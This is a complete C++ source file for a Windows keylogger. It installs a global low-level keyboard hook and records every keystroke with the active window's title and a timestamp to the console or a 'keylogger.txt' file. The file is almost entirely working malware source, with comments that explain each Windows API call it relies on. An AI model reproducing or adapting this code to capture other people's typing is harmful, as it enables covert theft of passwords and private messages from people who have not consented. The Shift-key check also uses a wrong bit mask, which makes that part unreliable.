#define UNICODE

#include <windows.h>
#include <iomanip>
#include <ctime>
#include <map>
#include <string>
#include <fstream>
#include <sstream>
#include <iostream>

/*
LOG_MODE:
== 0 => log on console
== 1 => log in file
*/ 
#define LOG_MODE 0

#if LOG_MODE == 1
std::ofstream log_file;
#endif

//name of previous active forground window
std::string prev_fg_win;

const std::map<int, std::string> keyname{ 
	{VK_CAPITAL, "<CAPSLOCK>" },
    {VK_BACK, "<BACKSPACE>" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"<TAB>" },
	{VK_SHIFT,	"<SHIFT>" },
	{VK_LSHIFT,	"<LSHIFT>" },
	{VK_RSHIFT,	"<RSHIFT>" },
	{VK_CONTROL, "<CONTROL>" },
	{VK_LCONTROL, "<LCONTROL>" },
	{VK_RCONTROL, "<RCONTROL>" },
	{VK_MENU, "<ALT>" },
	{VK_LWIN, "<LWIN>" },
	{VK_RWIN, "<RWIN>" },
	{VK_ESCAPE, "<ESCAPE>" },
	{VK_END, "<END>" },
	{VK_HOME, "<HOME>" },
	{VK_LEFT, "<LEFT>" },
	{VK_RIGHT, "<RIGHT>" },
	{VK_UP, "<UP>" },
	{VK_DOWN, "<DOWN>" },
	{VK_PRIOR, "<PG_UP>" },
	{VK_NEXT, "<PG_DOWN>" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL, "." },
	{VK_OEM_PLUS, "+" },
	{VK_OEM_MINUS, "-" },
	{VK_ADD, "+" },
	{VK_SUBTRACT, "-" },
};

/*
https://docs.microsoft.com/en-us/windows/win32/inputdev/about-keyboard-input
*/

bool checkCAPS_LSHIFT_RSHIFT()
{
    //https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate

    //if least significant bit is 1, then the key is toggled => CAPSLOCK is ON
    bool uppercase = GetKeyState(VK_CAPITAL) & 1;

    //if most significant bit is 1, then key is holded down
    if((GetKeyState(VK_SHIFT) & 0x1000) || (GetKeyState(VK_LSHIFT) & 0x1000) || (GetKeyState(VK_RSHIFT) & 0x1000))
    {
        uppercase = !uppercase;
    }
    
    return uppercase;
}

/*
return string containing local time 
*/
std::string getLocalTime()
{
    auto t = std::time(nullptr);
    auto tm = *std::localtime(&t);
    std::stringstream ss;
    ss<<std::put_time(&tm, "%d-%m-%Y %H-%M-%S");
    return ss.str();
}

/*
retrives Handle to foreground window and returns string contaning name of foreground window,
if foreground window remains same as before then empty string is returned
*/
std::string getForegroundWindowInfo()
{
    std::string fg_win;

    HWND fg_handle = GetForegroundWindow();
    if(fg_handle){
        char win_name[1024];
        if(GetWindowTextA(fg_handle, win_name, 1024)){
            fg_win = std::string(win_name);
        }
        
        if(fg_win == prev_fg_win){
            return std::string("");
        }
        else{
            prev_fg_win = fg_win;
            fg_win = "\n[ " + fg_win + " ] - ";
            fg_win += "[ " + getLocalTime() + " ]\n";
        }
    }
    
    return fg_win;
}

void saveKey(int vkCode)
{
    auto it = keyname.find(vkCode);
    std::string s;

    s = getForegroundWindowInfo();

    if(it != keyname.end())
    {
        s = it->second;
    }
    else
    {
        if(!checkCAPS_LSHIFT_RSHIFT())
        {
            vkCode = tolower(vkCode);
        }
        s.push_back(vkCode);
    }
    #if LOG_MODE == 0
    std::cout<<s;
    #else
    log_file<<s;
    log_file.flush();
    #endif

}

/*
https://docs.microsoft.com/en-us/windows/win32/winmsg/keyboardproc
The system calls this function whenever an application calls the GetMessage or 
PeekMessage function and there is a keyboard message (WM_KEYUP or WM_KEYDOWN) to be processed.
*/
/*
https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
Type: WPARAM wParam: The virtual-key code of the key that generated the keystroke message.
lParam parameter of a keystroke message contains additional information about the keystroke that generated the message. 
This information includes the repeat count, the scan code, the extended-key flag, 
the context code, the previous key-state flag, and the transition-state flag

*/


LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
   // process event
    if(nCode >= 0){
        if(wParam == WM_KEYDOWN){
            KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            // std::cout<<"\nlogg "<<(char)kbdStruct.vkCode<<"\n";
            saveKey(kbdStruct.vkCode);
        }
    }

    /*
    Calling the CallNextHookEx function to chain to the next hook procedure is optional, 
    but it is highly recommended; otherwise, other applications that have installed hooks will not receive 
    hook notifications and may behave incorrectly as a result
    */
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}




int main(){

    #if LOG_MODE == 1
    const char* log_filename = "keylogger.txt";
	log_file.open(log_filename, std::ofstream::app);
    #endif

    /*
    Installs an application-defined hook procedure into a hook chain.
    */
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, HookProc, NULL, 0);
    if(hook == NULL){
        std::cout<<"can\'t create hook\n";
    }

    // loop to keep the console application running.
	/*
    GetMessage
    Retrieves a message from the calling thread's message queue.
    If the function retrieves a message other than WM_QUIT, the return value is nonzero.
    */
    MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
    
    /*
    Before terminating, an application must call the UnhookWindowsHookEx function to 
    free system resources associated with the hook.
    */

    BOOL unhooked_success = UnhookWindowsHookEx(hook);
    if(!unhooked_success){
        std::cout<<"Failed to unhook\n";
    }
    
    #if LOG_MODE == 1
    log_file.close();
    #endif

}